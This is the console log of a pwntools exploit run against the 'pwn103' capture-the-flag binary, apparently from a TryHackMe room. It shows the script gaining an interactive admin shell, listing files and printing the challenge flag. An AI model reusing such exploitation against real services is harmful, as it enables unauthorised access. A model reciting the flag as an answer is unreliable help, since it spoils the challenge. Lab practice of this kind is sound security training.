[+] Opening connection to 10.10.47.113 on port 9003: Done
[*] Loaded 14 cached gadgets for './pwn103-1644300337872.pwn103'
/mnt/c/Users/hzqzz/Downloads/pwn101/exploit.py:38: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.recvuntil('Choose the channel:')
/mnt/c/Users/hzqzz/Downloads/pwn101/exploit.py:39: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.sendline('3')
/mnt/c/Users/hzqzz/Downloads/pwn101/exploit.py:40: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.recvuntil('------[pwner]: ')
[*] Switching to interactive mode
Try harder!!!

ğŸ‘®  Admins only:

Welcome admin ğŸ˜„
$ ls
flag.txt
pwn103
pwn103.c
$ cat flag.txt
THM{w3lC0m3_4Dm1N}
```
